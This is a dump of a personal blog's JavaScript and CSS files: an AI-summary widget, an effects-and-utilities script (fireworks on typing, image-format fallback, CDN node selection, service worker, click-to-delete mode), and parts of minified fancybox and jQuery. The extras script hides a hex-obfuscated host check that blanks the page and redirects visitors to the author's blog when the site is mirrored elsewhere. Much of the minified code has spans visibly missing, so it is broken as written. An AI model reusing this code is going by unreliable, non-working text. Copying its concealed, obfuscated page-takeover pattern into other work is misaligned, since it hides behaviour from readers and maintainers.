#49b1f5;color:#fff;border-radius:5px;}@media screen and (max-width:768px){#post-ai .ai-btn-box{justify-content:center;}}#post-ai .ai-title>svg{width:21px;height:21px;}#post-ai .ai-title>svg path{fill:var(--ai-font-color);}#post-ai .ai-Toggle{font-size:12px;border:var(--ai-border);background:var(--ai-btn-bg);color:var(--ai-btn-color);padding:3px 4px;border-radius:4px;margin-left:6px;cursor:pointer;-webkit-transition:.3s;-moz-transition:.3s;-o-transition:.3s;-ms-transition:.3s;transition:.3s;font-weight:bolder;pointer-events:none;opacity:0;}#post-ai .ai-Toggle:hover{background:#49b0f5dc;}#post-ai .ai-speech-box{width:21px;height:21px;background:var(--ai-font-color);margin-left:7px;border-radius:50%;display:flex;flex-direction:row;flex-wrap:wrap;align-content:center;justify-content:center;pointer-events:none;opacity:0;-webkit-transition:.3s;-moz-transition:.3s;-o-transition:.3s;-ms-transition:.3s;transition:.3s;cursor:pointer;}#post-ai .ai-speech-content{width:8px;background:var(--ai-speech-content);height:8px;border-radius:50%;-webkit-transition:.3s;-moz-transition:.3s;-o-transition:.3s;-ms-transition:.3s;transition:.3s;}#post-ai .ai-speech-box:hover .ai-speech-content{background:#49b0f5;}@keyframes ai_breathe{0%{transform:scale(0.9);-webkit-transform:scale(0.9);-moz-transform:scale(0.9);-ms-transform:scale(0.9);-o-transform:scale(0.9);}50%{transform:scale(1);-webkit-transform:scale(1);-moz-transform:scale(1);-ms-transform:scale(1);-o-transform:scale(1);}}`; AI_option.additional_css && (styleElement.textContent += AI_option.additional_css); document.head.appendChild(styleElement); } ai_init(); } } // 兼容旧版本配置项 if(typeof ai_option!==\"undefined\"){ console.log(\"正在使用旧版本配置方式，请前往项目仓库查看最新配置写法\"); new ChucklePostAI(ai_option); }"},{"path":"/js/extra.js","content":"/* 烟花特效 */ (function webpackUniversalModuleDefinition(root,factory){if(typeof exports==='object'&&typeof module==='object')module.exports=factory();else if(typeof define==='function'&&define.amd)define([],factory);else if(typeof exports==='object')exports[\"POWERMODE\"]=factory();else root[\"POWERMODE\"]=factory()})(this,function(){return(function(modules){var installedModules={};function __webpack_require__(moduleId){if(installedModules[moduleId])return installedModules[moduleId].exports;var module=installedModules[moduleId]={exports:{},id:moduleId,loaded:false};modules[moduleId].call(module.exports,module,module.exports,__webpack_require__);module.loaded=true;return module.exports}__webpack_require__.m=modules;__webpack_require__.c=installedModules;__webpack_require__.p=\"\";return __webpack_require__(0)})([function(module,exports,__webpack_require__){'use strict';var canvas=document.createElement('canvas');canvas.width=window.innerWidth;canvas.height=window.innerHeight;canvas.style.cssText='position:fixed;top:0;left:0;pointer-events:none;z-index:999999';window.addEventListener('resize',function(){canvas.width=window.innerWidth;canvas.height=window.innerHeight});document.body.appendChild(canvas);var context=canvas.getContext('2d');var particles=[];var particlePointer=0;POWERMODE.shake=true;function getRandom(min,max){return Math.random()*(max-min)+min}function getColor(el){if(POWERMODE.colorful){var u=getRandom(0,360);return'hsla('+getRandom(u-10,u+10)+', 100%, '+getRandom(50,80)+'%, '+1+')'}else{return window.getComputedStyle(el).color}}function getCaret(){var el=document.activeElement;var bcr;if(el.tagName==='TEXTAREA'||(el.tagName==='INPUT'&&el.getAttribute('type')==='text')){var offset=__webpack_require__(1)(el,el.selectionStart);bcr=el.getBoundingClientRect();return{x:offset.left+bcr.left,y:offset.top+bcr.top,color:getColor(el)}}var selection=window.getSelection();if(selection.rangeCount){var range=selection.getRangeAt(0);var startNode=range.startContainer;if(startNode.nodeType===document.TEXT_NODE){startNode=startNode.parentNode}bcr=range.getBoundingClientRect();return{x:bcr.left,y:bcr.top,color:getColor(startNode)}}return{x:0,y:0,color:'transparent'}}function createParticle(x,y,color){return{x:x,y:y,alpha:1,color:color,velocity:{x:-1+Math.random()*2,y:-3.5+Math.random()*2}}}function POWERMODE(){{var caret=getCaret();var numParticles=5+Math.round(Math.random()*10);while(numParticles--){particles[particlePointer]=createParticle(caret.x,caret.y,caret.color);particlePointer=(particlePointer+1)%500}}{if(POWERMODE.shake){var intensity=1+2*Math.random();var x=intensity*(Math.random()>0.5?-1:1);var y=intensity*(Math.random()>0.5?-1:1);document.body.style.marginLeft=x+'px';document.body.style.marginTop=y+'px';setTimeout(function(){document.body.style.marginLeft='';document.body.style.marginTop=''},75)}}};POWERMODE.colorful=false;function loop(){requestAnimationFrame(loop);context.clearRect(0,0,canvas.width,canvas.height);for(var i=0;i{if(link.closest(`div.${pc}`)){skip=true}});if(!skip){const href=link.getAttribute('href');if(href&&(href.startsWith('http')||href.startsWith('/'))){link.innerHTML+=``}}})}); // 插入字数统计 document.getElementById(\"all-posts-count\").innerHTML = allpostscount; document.getElementById(\"all-post-words\").innerHTML = allpostswords; // 过期提醒 if (gtime_days > 180) { document.getElementById('gtime').innerHTML = `提醒本文最后更新于 ${gtime_days} 天前，其中某些信息可能已经过时，请谨慎使用！如果发现内容有误，请在评论区告知。`; } // © window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"]['\\x61\\x64\\x64\\x45\\x76\\x65\\x6e\\x74\\x4c\\x69\\x73\\x74\\x65\\x6e\\x65\\x72']('\\x44\\x4f\\x4d\\x43\\x6f\\x6e\\x74\\x65\\x6e\\x74\\x4c\\x6f\\x61\\x64\\x65\\x64',function(){const host=window['\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e']['\\x68\\x6f\\x73\\x74'];if(host!=='\\x62\\x6c\\x6f\\x67\\x2e\\x68\\x7a\\x63\\x68\\x75\\x2e\\x74\\x6f\\x70'&&!host['\\x73\\x74\\x61\\x72\\x74\\x73\\x57\\x69\\x74\\x68']('\\x6c\\x6f\\x63\\x61\\x6c\\x68\\x6f\\x73\\x74')&&!host['\\x73\\x74\\x61\\x72\\x74\\x73\\x57\\x69\\x74\\x68']('\\x31\\x32\\x37\\x2e\\x30\\x2e\\x30\\x2e\\x31')){window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"]['\\x62\\x6f\\x64\\x79']['\\x69\\x6e\\x6e\\x65\\x72\\x48\\x54\\x4d\\x4c']=['\\x3c\\x64\\x69\\x76 \\x73\\x74\\x79\\x6c\\x65\\x3d\\x22\\x6d\\x61\\x72\\x67\\x69\\x6e\\x3a \\x61\\x75\\x74\\x6f\\x3b\\x22\\x3e','\\x3c\\x68\\x31\\x3e\\u5f53\\u524d\\u9875\\u9762\\u5e76\\u975e\\u672c\\u6587\\u4f5c\\u8005\\u7684\\u4e3b\\u9875\\uff0c\\u5c06\\u5728\\u4e94\\u79d2\\u540e\\u8df3\\u8f6c\\u3002\\x3c\\x2f\\x68\\x31\\x3e','\\x3c\\x62\\x72 \\x2f\\x3e','\\x3c\\x68\\x31\\x3e\\u5982\\u6709\\u7591\\u60d1\\u8bf7\\u8054\\u7cfb\\uff1a\\x74\\x68\\x75\\x6e\\x38\\x38\\x38 \\x61\\x74 \\x68\\x7a\\x63\\x68\\x75\\x2e\\x74\\x6f\\x70\\x3c\\x2f\\x68\\x31\\x3e','\\x3c\\x2f\\x64\\x69\\x76\\x3e',]['\\x6a\\x6f\\x69\\x6e']('');window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"]['\\x62\\x6f\\x64\\x79']['\\x73\\x74\\x79\\x6c\\x65']=['\\x62\\x61\\x63\\x6b\\x67\\x72\\x6f\\x75\\x6e\\x64\\x2d\\x63\\x6f\\x6c\\x6f\\x72\\x3a \\x77\\x68\\x69\\x74\\x65\\x3b','\\x63\\x6f\\x6c\\x6f\\x72\\x3a \\x62\\x6c\\x61\\x63\\x6b\\x3b','\\x74\\x65\\x78\\x74\\x2d\\x61\\x6c\\x69\\x67\\x6e\\x3a \\x63\\x65\\x6e\\x74\\x65\\x72\\x3b','\\x66\\x6f\\x6e\\x74\\x2d\\x73\\x69\\x7a\\x65\\x3a \\x35\\x30\\x70\\x78\\x3b','\\x77\\x69\\x64\\x74\\x68\\x3a \\x31\\x30\\x30\\x76\\x77\\x3b','\\x68\\x65\\x69\\x67\\x68\\x74\\x3a \\x31\\x30\\x30\\x76\\x68\\x3b','\\x64\\x69\\x73\\x70\\x6c\\x61\\x79\\x3a \\x66\\x6c\\x65\\x78\\x3b',]['\\x6a\\x6f\\x69\\x6e']('');setTimeout(()=>{window['\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e']['\\x68\\x72\\x65\\x66']='\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x62\\x6c\\x6f\\x67\\x2e\\x68\\x7a\\x63\\x68\\x75\\x2e\\x74\\x6f\\x70'},5000)}}); document.addEventListener('DOMContentLoaded', function() { // 从页面中提取第一个AVIF图片链接 // function getFirstPictureUrl(type) { // const images = document.querySelectorAll('img'); // for (let img of images) { // if (img.getAttribute(\"data-src\") && img.getAttribute(\"data-src\").includes('fmt=',type)) { // return img.getAttribute(\"data-src\"); // } // } // return null; // } // 检测浏览器是否支持AVIF格式 function supportCheck(type, url) { return new Promise(resolve => { // 先从localStorage中获取结果 const result = localStorage.getItem(\"support_\" + type); if (result !== null) { // 如果结果存在，就直接返回 console.log(type, \"support status loaded from localStorage:\", result === \"true\"); resolve(result === \"true\"); } else { // 如果结果不存在，就进行检测 const image = new Image(); image.src = url; image.onload = () => { console.log(type, \"supported\"); // 将结果保存到localStorage localStorage.setItem(\"support_\" + type, \"true\"); resolve(true); }; image.onerror = () => { console.log(type, \"not supported\"); // 将结果保存到localStorage localStorage.setItem(\"support_\" + type, \"false\"); // 显示提示消息 hud.toast(`当前浏览器不支持使用${type}，已降级为使用其他格式`, 2500); resolve(false); }; } }); } // 替换图片URL中的avif为webp function replacepicture(from, to) { const images = document.querySelectorAll('img'); images.forEach(img => { let attr = img.src.startsWith('data') ? 'data-src' : 'src'; if (img.getAttribute(attr) && img.getAttribute(attr).includes('fmt=' + from)) { if (to == \"\") { console.log(\"Replacing \", from, \" with origin ext for image:\", img.getAttribute(attr)); img.setAttribute(attr, img.getAttribute(attr).replace('fmt=' + from, '')); } else { console.log(\"Replacing \", from, \" with \", to, \" for image:\", img.getAttribute(attr)); img.setAttribute(attr, img.getAttribute(attr).replace('fmt=' + from, 'fmt=' + to)); } } }); } const firstAvifUrl = \"/img/check/status.avif\"; // 获取第一个AVIF图片链接 // 使用第一个AVIF图片链接进行检测 supportCheck(\"AVIF\", firstAvifUrl).then(supported => { if (!supported) { replacepicture(\"avif\", \"webp\"); const firstWebpUrl = \"/img/check/status.webp\"; // 获取第一个WEBP图片链接 supportCheck(\"WEBP\", firstWebpUrl).then(supported => { if (!supported) { // hud.toast(\"当前浏览器不支持使用webp，已降级为使用原始图片\", 2500); // replacepicture(\"webp\",\"\"); replacepicture(\"webp\", \"png\"); } else { console.log(\"Webp images will be used.\"); } }); } else { console.log(\"AVIF images will be used.\"); } }); selectFastNode(); }); // 看看哪个节点快 function selectFastNode(force) { console.log('[ONEP,selectFastNode] Running...'); const selectdisabled = localStorage.getItem('onep.cdn.select.disabled'); if (selectdisabled) { console.log('[ONEP,selectFastNode] Skipping due to select disabled.'); return; } const storedData = localStorage.getItem('onep.cdn.nodelist'); if (storedData) { const data = JSON.parse(storedData); const now = new Date(); if (data.link === null && now.getTime() - data.time < 5 * 60 * 1000 && !force) { console.log('[ONEP,selectFastNode] Skipping due to recent failure to fetch nodes.'); return; } else if (now.getTime() - data.time < 5 * 60 * 1000 && !force) { replaceImageSource(data.link); return; } } const formData = new FormData(); formData.append('token', 'hzchu.top'); fetch('https://onep.hzchu.top/_api/nodeslist', { method: 'POST', body: formData }) .then(response => response.json()) .then(data => { let link = null; if (data.nodes && Object.keys(data.nodes).length > 0) { link = data.nodes[Object.keys(data.nodes)[0]]; replaceImageSource(link); } else { console.log('[ONEP,selectFastNode] Failed to fetch nodes, will skip checks for the next 5 minutes.'); } localStorage.setItem('onep.cdn.nodelist', JSON.stringify({ link: link, time: new Date().getTime() })); }) .catch(error => { console.error('[ONEP,selectFastNode] Error:', error); localStorage.setItem('onep.cdn.nodelist', JSON.stringify({ link: null, time: new Date().getTime() })); }); console.log('[ONEP,selectFastNode] Done.'); return true; } function replaceImageSource(newLink) { const images = document.querySelectorAll('img'); images.forEach(img => { let attr = img.src.startsWith('data') ? 'data-src' : 'src'; if (img.getAttribute(attr) && img.getAttribute(attr).startsWith('https://onep.hzchu.top')) { console.log(\"[ONEP,selectFastNode] Replacing \", img.getAttribute(attr), \" with \", newLink); img.setAttribute(attr, img.getAttribute(attr).replace('https://onep.hzchu.top', newLink)); } }); } // sw navigator.serviceWorker.register('/sw.js', { updateViaCache: 'none' }) .then(function(registration) { // 注册成功 console.log('ServiceWorker registration successful with scope: ', registration.scope); }) .catch(function(err) { // 注册失败 console.log('ServiceWorker registration failed: ', err); }); // 删除模式 let deleteMode = false; function toggleDeleteMode() { deleteMode = !deleteMode; if (deleteMode) { hud.toast(\"已开启删除模式\", 2500); document.addEventListener('click', deleteElement, true); } else { hud.toast(\"已关闭删除模式\", 2500); document.removeEventListener('click', deleteElement, true); } } function deleteElement(event) { if (deleteMode && event.target !== document.body && !event.target.closest('.delmode-btn')) { event.preventDefault(); // 阻止默认行为 event.target.remove(); } }"},{"path":"/js/fancybox.umd.min.js","content":"!function(e,t){\"object\"==typeof exports&&\"undefined\"!=typeof module?t(exports):\"function\"==typeof define&&define.amd?define([\"exports\"],t):t((e=\"undefined\"!=typeof globalThis?globalThis:e||self).window=e.window||{})}(this,function(F){\"use strict\";function j(e,t=void 0){return!(!e||e===document.body||t&&e===t)&&(s(e)?e:j(e.parentElement,t))}function d(e){var t=(new DOMParser).parseFromString(e,\"text/html\").body;if(1(e=parseFloat(e+\"\")||0,Math.round((e+Number.EPSILON)*t)/t),s=function(e){if(!(e&&e instanceof Element&&e.offsetParent))return!1;const t=e.scrollHeight>e.clientHeight,i=window.getComputedStyle(e).overflowY,n=-1!==i.indexOf(\"hidden\"),s=-1!==i.indexOf(\"visible\");return t&&!n&&!s},H=e=>(\"\"+(e||\"\")).split(\" \").filter(e=>!!e),g=(t,e,i)=>{H(e).forEach(e=>{t&&t.classList.toggle(e,i||!1)})};class o{constructor(e){Object.defineProperty(this,\"pageX\",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,\"pageY\",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,\"clientX\",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,\"clientY\",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,\"id\",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,\"time\",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,\"nativePointer\",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.nativePointer=e,this.pageX=e.pageX,this.pageY=e.pageY,this.clientX=e.clientX,this.clientY=e.clientY,this.id=self.Touch&&e instanceof Touch?e.identifier:-1,this.time=Date.now()}}const a={passive:!1};class B{constructor(e,{start:t=()=>!0,move:i=()=>{},end:n=()=>{}}){Object.defineProperty(this,\"element\",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,\"startCallback\",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,\"moveCallback\",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,\"endCallback\",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,\"currentPointers\",{enumerable:!0,configurable:!0,writable:!0,value:[]}),Object.defineProperty(this,\"startPointers\",{enumerable:!0,configurable:!0,writable:!0,value:[]}),this.element=e,this.startCallback=t,this.moveCallback=i,this.endCallback=n;for(const e of[\"onPointerStart\",\"onTouchStart\",\"onMove\",\"onTouchEnd\",\"onPointerEnd\",\"onWindowBlur\"])this[e]=this[e].bind(this);this.element.addEventListener(\"mousedown\",this.onPointerStart,a),this.element.addEventListener(\"touchstart\",this.onTouchStart,a),this.element.addEventListener(\"touchmove\",this.onMove,a),this.element.addEventListener(\"touchend\",this.onTouchEnd),this.element.addEventListener(\"touchcancel\",this.onTouchEnd)}onPointerStart(e){if(e.buttons&&0===e.button){const t=new o(e);this.currentPointers.some(e=>e.id===t.id)||this.triggerPointerStart(t,e)&&(window.addEventListener(\"mousemove\",this.onMove),window.addEventListener(\"mouseup\",this.onPointerEnd),window.addEventListener(\"blur\",this.onWindowBlur))}}onTouchStart(e){for(const t of Array.from(e.changedTouches||[]))this.triggerPointerStart(new o(t),e);window.addEventListener(\"blur\",this.onWindowBlur)}onMove(t){const e=this.currentPointers.slice(),i=\"changedTouches\"in t?Array.from(t.changedTouches||[]).map(e=>new o(e)):[new o(t)],n=[];for(const t of i){const e=this.currentPointers.findIndex(e=>e.id===t.id);e\"object\"==typeof e&&null!==e&&e.constructor===Object&&\"[object Object]\"===Object.prototype.toString.call(e),u=(n,...t)=>{const i=t.length;for(let e=0;e{var i=Array.isArray(t)?[]:{};n[e]||Object.assign(n,{[e]:i}),X(t)?Object.assign(n[e],u(i,t)):Array.isArray(t)?Object.assign(n,{[e]:[...t]}):Object.assign(n,{[e]:t})})}return n};class e{constructor(e={}){Object.defineProperty(this,\"options\",{enumerable:!0,configurable:!0,writable:!0,value:e}),Object.defineProperty(this,\"events\",{enumerable:!0,configurable:!0,writable:!0,value:new Map}),this.setOptions(e);for(const e of Object.getOwnPropertyNames(Object.getPrototypeOf(this)))e.startsWith(\"on\")&&\"function\"==typeof this[e]&&(this[e]=this[e].bind(this))}setOptions(e){this.options=e?u({},this.constructor.defaults,e):{};for(const[e,t]of Object.entries(this.option(\"on\")||{}))this.on(e,t)}option(e,...t){let i=W(e,this.options);return i=i&&\"function\"==typeof i?i.call(this,this,...t):i}optionFor(e,t,i,...n){let s=W(t,e);var o;(s=\"false\"===(s=\"true\"===(s=\"string\"!=typeof(o=s)||isNaN(o)||isNaN(parseFloat(o))?s:parseFloat(s))?!0:s)?!1:s)&&\"function\"==typeof s&&(s=s.call(this,this,e,...n));let a=W(t,this.options);return a&&\"function\"==typeof a?s=a.call(this,this,e,...n,s):void 0===s&&(s=a),void 0===s?i:s}cn(e){var t=this.options.classes;return t&&t[e]||\"\"}localize(t,i=[]){t=String(t).replace(/\\{\\{(\\w+).?(\\w+)?\\}\\}/g,(e,t,i)=>{let n=\"\";return i?n=this.option(t[0]+t.toLowerCase().substring(1)+\".l10n.\"+i):t&&(n=this.option(\"l10n.\"+t)),n=n||e});for(let e=0;et)}on(e,i){let t=[];\"string\"==typeof e?t=e.split(\" \"):Array.isArray(e)&&(t=e),this.events||(this.events=new Map),t.forEach(e=>{let t=this.events.get(e);t||(this.events.set(e,[]),t=[]),t.includes(i)||t.push(i),this.events.set(e,t)})}off(e,i){let t=[];\"string\"==typeof e?t=e.split(\" \"):Array.isArray(e)&&(t=e),t.forEach(e=>{const t=this.events.get(e);if(Array.isArray(t)){const e=t.indexOf(i);-1e(this,...t)),\"*\"!==e&&this.emit(\"*\",e,...t)}}Object.defineProperty(e,\"version\",{enumerable:!0,configurable:!0,writable:!0,value:\"5.0.22\"}),Object.defineProperty(e,\"defaults\",{enumerable:!0,configurable:!0,writable:!0,value:{}});class Y extends e{constructor(e={}){super(e),Object.defineProperty(this,\"plugins\",{enumerable:!0,configurable:!0,writable:!0,value:{}})}attachPlugins(e={}){const t=new Map;for(var[i,n]of Object.entries(e)){const e=this.option(i),s=this.plugins[i];s||!1===e?s&&!1===e&&(s.detach(),delete this.plugins[i]):t.set(i,new n(this,e||{}))}for(const[e,o]of t)this.plugins[e]=o,o.attach();this.emit(\"attachPlugins\")}detachPlugins(e){for(const t of e=e||Object.keys(this.plugins)){const e=this.plugins[t];e&&e.detach(),delete this.plugins[t]}return this.emit(\"detachPlugins\"),this}}var x,p;(i=x=x||{})[i.Init=0]=\"Init\",i[i.Error=1]=\"Error\",i[i.Ready=2]=\"Ready\",i[i.Panning=3]=\"Panning\",i[i.Mousemove=4]=\"Mousemove\",i[i.Destroy=5]=\"Destroy\";const f=[\"a\",\"b\",\"c\",\"d\",\"e\",\"f\"],q={PANUP:\"Move up\",PANDOWN:\"Move down\",PANLEFT:\"Move left\",PANRIGHT:\"Move right\",ZOOMIN:\"Zoom in\",ZOOMOUT:\"Zoom out\",TOGGLEZOOM:\"Toggle zoom level\",TOGGLE1TO1:\"Toggle zoom level\",ITERATEZOOM:\"Toggle zoom level\",ROTATECCW:\"Rotate counterclockwise\",ROTATECW:\"Rotate clockwise\",FLIPX:\"Flip horizontally\",FLIPY:\"Flip vertically\",FITX:\"Fit horizontally\",FITY:\"Fit vertically\",RESET:\"Reset\",TOGGLEFS:\"Toggle fullscreen\"},V={content:null,width:\"auto\",height:\"auto\",panMode:\"drag\",touch:!0,dragMinThreshold:3,lockAxis:!1,mouseMoveFactor:1,mouseMoveFriction:.12,zoom:!0,pinchToZoom:!0,panOnlyZoomed:\"auto\",minScale:1,maxScale:2,friction:.25,dragFriction:.35,decelFriction:.05,click:\"toggleZoom\",dblClick:!1,wheel:\"zoom\",wheelLimit:7,spinner:!0,bounds:\"auto\",infinite:!1,rubberband:!0,bounce:!0,maxVelocity:75,transformParent:!1,classes:{content:\"f-panzoom__content\",isLoading:\"is-loading\",canZoomIn:\"can-zoom_in\",canZoomOut:\"can-zoom_out\",isDraggable:\"is-draggable\",isDragging:\"is-dragging\",inFullscreen:\"in-fullscreen\",htmlHasFullscreen:\"with-panzoom-in-fullscreen\"},l10n:q},m='',l=e=>e&&null!==e&&e instanceof Element&&\"nodeType\"in e,b=(t,e)=>{t&&H(e).forEach(e=>{t.classList.remove(e)})},v=(t,e)=>{t&&H(e).forEach(e=>{t.classList.add(e)})},y={a:1,b:0,c:0,d:1,e:0,f:0},w=1e3,S=\"mousemove\",Z=\"drag\",U=\"content\";let G=null,$=null;class c extends Y{get isTouchDevice(){return $=null===$?window.matchMedia(\"(hover: none)\").matches:$}get isMobile(){return G=null===G?/iPhone|iPad|iPod|Android/i.test(navigator.userAgent):G}get panMode(){return this.options.panMode!==S||this.isTouchDevice?Z:S}get panOnlyZoomed(){var e=this.options.panOnlyZoomed;return\"auto\"===e?this.isTouchDevice:e}get isInfinite(){return this.option(\"infinite\")}get angle(){return 180*Math.atan2(this.current.b,this.current.a)/Math.PI||0}get targetAngle(){return 180*Math.atan2(this.target.b,this.target.a)/Math.PI||0}get scale(){var{a:e,b:t}=this.current;return Math.sqrt(e*e+t*t)||1}get targetScale(){var{a:e,b:t}=this.target;return Math.sqrt(e*e+t*t)||1}get minScale(){return this.option(\"minScale\")||1}get fullScale(){var e=this[\"contentRect\"];return e.fullWidth/e.fitWidth||1}get maxScale(){return this.fullScale*(this.option(\"maxScale\")||1)||1}get coverScale(){var{containerRect:e,contentRect:t}=this,e=Math.max(e.height/t.fitHeight,e.width/t.fitWidth)||1;return Math.min(this.fullScale,e)}get isScaling(){return 1e-5e)return!1}return!(!this.ignoreBounds&&!this.checkBounds().inBounds)}constructor(e,t={},i={}){if(super(t),Object.defineProperty(this,\"pointerTracker\",{enumerable:!0,configurable:!0,writable:!0,value:null}),Object.defineProperty(this,\"resizeObserver\",{enumerable:!0,configurable:!0,writable:!0,value:null}),Object.defineProperty(this,\"updateTimer\",{enumerable:!0,configurable:!0,writable:!0,value:null}),Object.defineProperty(this,\"clickTimer\",{enumerable:!0,configurable:!0,writable:!0,value:null}),Object.defineProperty(this,\"rAF\",{enumerable:!0,configurable:!0,writable:!0,value:null}),Object.defineProperty(this,\"isTicking\",{enumerable:!0,configurable:!0,writable:!0,value:!1}),Object.defineProperty(this,\"friction\",{enumerable:!0,configurable:!0,writable:!0,value:0}),Object.defineProperty(this,\"ignoreBounds\",{enumerable:!0,configurable:!0,writable:!0,value:!1}),Object.defineProperty(this,\"isBouncingX\",{enumerable:!0,configurable:!0,writable:!0,value:!1}),Object.defineProperty(this,\"isBouncingY\",{enumerable:!0,configurable:!0,writable:!0,value:!1}),Object.defineProperty(this,\"clicks\",{enumerable:!0,configurable:!0,writable:!0,value:0}),Object.defineProperty(this,\"trackingPoints\",{enumerable:!0,configurable:!0,writable:!0,value:[]}),Object.defineProperty(this,\"pwt\",{enumerable:!0,configurable:!0,writable:!0,value:0}),Object.defineProperty(this,\"cwd\",{enumerable:!0,configurable:!0,writable:!0,value:0}),Object.defineProperty(this,\"pmme\",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,\"state\",{enumerable:!0,configurable:!0,writable:!0,value:x.Init}),Object.defineProperty(this,\"isDragging\",{enumerable:!0,configurable:!0,writable:!0,value:!1}),Object.defineProperty(this,\"container\",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,\"content\",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,\"spinner\",{enumerable:!0,configurable:!0,writable:!0,value:null}),Object.defineProperty(this,\"containerRect\",{enumerable:!0,configurable:!0,writable:!0,value:{width:0,height:0,innerWidth:0,innerHeight:0}}),Object.defineProperty(this,\"contentRect\",{enumerable:!0,configurable:!0,writable:!0,value:{top:0,right:0,bottom:0,left:0,fullWidth:0,fullHeight:0,fitWidth:0,fitHeight:0,width:0,height:0}}),Object.defineProperty(this,\"dragStart\",{enumerable:!0,configurable:!0,writable:!0,value:{x:0,y:0,top:0,left:0,time:0}}),Object.defineProperty(this,\"dragOffset\",{enumerable:!0,configurable:!0,writable:!0,value:{x:0,y:0,time:0}}),Object.defineProperty(this,\"current\",{enumerable:!0,configurable:!0,writable:!0,value:Object.assign({},y)}),Object.defineProperty(this,\"target\",{enumerable:!0,configurable:!0,writable:!0,value:Object.assign({},y)}),Object.defineProperty(this,\"velocity\",{enumerable:!0,configurable:!0,writable:!0,value:{a:0,b:0,c:0,d:0,e:0,f:0}}),Object.defineProperty(this,\"lockedAxis\",{enumerable:!0,configurable:!0,writable:!0,value:!1}),!e)throw new Error(\"Container Element Not Found\");this.container=e,this.initContent(),this.attachPlugins(Object.assign(Object.assign({},c.Plugins),i)),this.emit(\"init\");const n=this.content;if(n.addEventListener(\"load\",this.onLoad),n.addEventListener(\"error\",this.onError),this.isContentLoading){if(this.option(\"spinner\")){e.classList.add(this.cn(\"isLoading\"));const t=d(m);!e.contains(n)||n.parentElement instanceof HTMLPictureElement?this.spinner=e.appendChild(t):this.spinner=(null==(i=n.parentElement)?void 0:i.insertBefore(t,n))||null}this.emit(\"beforeLoad\")}else queueMicrotask(()=>{this.enable()})}initContent(){const e=this[\"container\"],t=this.cn(U);let i=this.option(U)||e.querySelector(\".\"+t);if(i||(i=e.querySelector(\"img,picture\")||e.firstElementChild)&&v(i,t),!(i=i instanceof HTMLPictureElement?i.querySelector(\"img\"):i))throw new Error(\"No content found\");this.content=i}onLoad(){this.spinner&&(this.spinner.remove(),this.spinner=null),this.option(\"spinner\")&&this.container.classList.remove(this.cn(\"isLoading\")),this.emit(\"afterLoad\"),this.state===x.Init?this.enable():this.updateMetrics()}onError(){this.state!==x.Destroy&&(this.spinner&&(this.spinner.remove(),this.spinner=null),this.stop(),this.detachEvents(),this.state=x.Error,this.emit(\"error\"))}attachObserver(){var e;const t=()=>.1{t()&&this.onResize(),this.updateTimer=null},500))):this.updateTimer&&(clearTimeout(this.updateTimer),this.updateTimer=null))})),null!=(e=this.resizeObserver)&&e.observe(this.container)}detachObserver(){var e;null!=(e=this.resizeObserver)&&e.disconnect()}attachEvents(){const e=this[\"container\"];e.addEventListener(\"click\",this.onClick,{passive:!1,capture:!1}),e.addEventListener(\"wheel\",this.onWheel,{passive:!1}),this.pointerTracker=new B(e,{start:this.onPointerDown,move:this.onPointerMove,end:this.onPointerUp}),document.addEventListener(S,this.onMouseMove)}detachEvents(){var e;const t=this[\"container\"];t.removeEventListener(\"click\",this.onClick,{passive:!1,capture:!1}),t.removeEventListener(\"wheel\",this.onWheel,{passive:!1}),null!=(e=this.pointerTracker)&&e.stop(),this.pointerTracker=null,document.removeEventListener(S,this.onMouseMove),document.removeEventListener(\"keydown\",this.onKeydown,!0),this.clickTimer&&(clearTimeout(this.clickTimer),this.clickTimer=null),this.updateTimer&&(clearTimeout(this.updateTimer),this.updateTimer=null)}animate(){var e=this.friction,t=(this.setTargetForce(),this.option(\"maxVelocity\"));for(const i of f)e?(this.velocity[i]*=1-e,t&&!this.isScaling&&(this.velocity[i]=Math.max(Math.min(this.velocity[i],t),-1*t)),this.current[i]+=this.velocity[i]):this.current[i]=this.target[i];this.setTransform(),this.setEdgeForce(),!this.isResting||this.isDragging?this.rAF=requestAnimationFrame(()=>this.animate()):this.stop(\"current\")}setTargetForce(){for(const e of f)\"e\"===e&&this.isBouncingX||\"f\"===e&&this.isBouncingY||(this.velocity[e]=(1/(1-this.friction)-1)*(this.target[e]-this.current[e]))}checkBounds(e=0,t=0){var i=this[\"current\"],e=i.e+e,i=i.f+t,t=this.getBounds(),{x:n,y:s}=t,o=n.min,n=n.max,a=s.min,s=s.max;let r=0,l=0;return o!==1/0&&e"},{"path":"/js/jquery.min.js","content":"/*! jQuery v3.7.1 | (c) OpenJS Foundation and other contributors | jquery.org/license */ !function(e,t){\"use strict\";\"object\"==typeof module&&\"object\"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error(\"jQuery requires a window with a document\");return t(e)}:t(e)}(\"undefined\"!=typeof window?window:this,function(ie,e){\"use strict\";var oe=[],r=Object.getPrototypeOf,ae=oe.slice,g=oe.flat?function(e){return oe.flat.call(e)}:function(e){return oe.concat.apply([],e)},s=oe.push,se=oe.indexOf,n={},i=n.toString,ue=n.hasOwnProperty,o=ue.toString,a=o.call(Object),le={},v=function(e){return\"function\"==typeof e&&\"number\"!=typeof 